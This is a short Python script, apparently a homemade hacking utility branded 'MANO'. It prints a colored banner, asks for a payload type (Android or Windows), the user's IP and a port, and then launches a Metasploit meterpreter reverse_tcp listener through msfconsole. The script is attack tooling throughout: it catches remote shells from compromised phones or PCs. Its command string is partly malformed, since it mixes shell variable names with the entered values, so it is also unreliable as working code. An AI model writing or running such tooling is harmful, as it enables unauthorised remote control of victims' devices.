import os
logo = '''
\033[1;36m███╗░░░███╗░█████╗░███╗░░██╗░█████╗░
████╗░████║██╔══██╗████╗░██║██╔══██╗
██╔████╔██║███████║██╔██╗██║██║░░██║
██║╚██╔╝██║██╔══██║██║╚████║██║░░██║
██║░╚═╝░██║██║░░██║██║░╚███║╚█████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░
'''
print (logo)
os.system("clear")
payload = input("\033[1;31mPAYLOAD TYPE ANDROID / WINDOWS : ")
os.system("ifconfig")
ip = input("\033[1;34m[===>] YOUR IP :  ")
port = input("\033[1;33m[===>] PORT ")
os.system("msfconsole -q -x "'"handler -p '+payload+"/meterpreter/reverse_tcp -H $lhost "+ip+ " -P $lport "+port+'"')
